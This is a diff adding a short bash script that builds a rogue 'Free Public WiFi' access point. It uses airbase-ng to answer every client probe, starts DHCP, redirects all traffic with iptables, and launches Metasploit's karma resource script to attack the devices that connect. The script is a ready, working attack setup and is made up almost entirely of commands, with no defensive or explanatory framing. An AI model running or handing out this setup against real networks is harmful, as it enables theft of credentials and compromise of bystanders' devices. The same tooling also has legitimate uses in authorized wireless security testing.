@@ -1,0 +1,43 @@
+#!/bin/bash
+#
+#	20110222 Brandon Pierce <brandon@ihashacks.com>
+#
+
+
+#
+# beacon the ESSID "Free WiFi", respond to all probe requests, and rebroadcast all probes as beacons for 30 seconds
+#
+
+/usr/sbin/airbase-ng -P -C 30 -e "Free Public WiFi" -v eth1
+
+
+
+#
+# we need to configure the IP address of the at0 interface to match
+#
+
+/sbin/ifconfig at0 up 192.168.79.1 netmask 255.255.255.0
+
+
+
+#
+# DHCP server needs to be started on the "at0" TUN/TAP interface created by airbase-ng
+#
+
+/usr/sbin/dhcpd3 -cf /etc/dhcpd.conf at0
+
+
+
+#
+#
+#
+
+/sbin/iptables -t nat -A PREROUTING -i at0 -j REDIRECT
+
+
+
+#
+# Metasploit Framework itself needs to be configured
+#
+
+/usr/local/bin/msfconsole -r /opt/metasploit3/msf3/scripts/resource/karma.rc
